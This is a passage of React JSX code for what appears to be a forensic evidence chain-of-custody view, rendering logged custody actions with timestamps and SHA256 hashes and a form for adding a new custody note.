                          <span className="font-bold uppercase text-cyan-400">
                            #{index + 1} {log.action}
                          </span>
                          <span>{new Date(log.timestamp).toLocaleString()}</span>
                        </div>
                        <p className="text-slate-200 font-sans">{log.details}</p>
                        <div className="text-[10px] text-slate-500 truncate pt-1">
                          Verified SHA256: <span className="text-slate-400">{log.sha256_at_action}</span> (by {log.performed_by})
                        </div>
                      </div>
                    </div>
                  ))}
                </div>

                {/* Append Custody Transfer Form */}
                <div className="pt-3 border-t border-slate-800 flex gap-2">
                  <input
                    type="text"
                    placeholder="Enter custody transfer, lab checkout, or verification note..."
                    value={custodyNote}
                    onChange={(e) => setCustodyNote(e.target.value)}
                    className="flex-1 px-3 py-1.5 bg-slate-950 border border-slate-800 rounded-lg text-xs font-mono text-slate-200 placeholder-slate-500 focus:outline-none focus:border-cyan-500"
                  />
                  <button
                    onClick={handleAddCustodyAction}
                    className="px-3.5 py-1.5 rounded-lg bg-cyan-600 hover:bg-cyan-500 text-white text-xs font-mono font-semibold transition cursor-pointer"
                  >
                    Log Custody Action
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  )
}
